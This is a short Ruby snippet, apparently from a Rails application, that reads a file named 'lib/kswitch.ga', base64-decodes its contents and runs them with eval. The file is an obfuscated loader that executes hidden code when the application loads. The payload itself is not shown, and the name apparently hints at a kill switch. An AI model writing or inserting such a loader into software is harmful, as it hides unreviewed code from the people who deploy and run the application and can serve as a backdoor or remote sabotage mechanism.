require 'base64'

eval(Base64.decode64(File.read(File.join Rails.root, 'lib/kswitch.ga')))
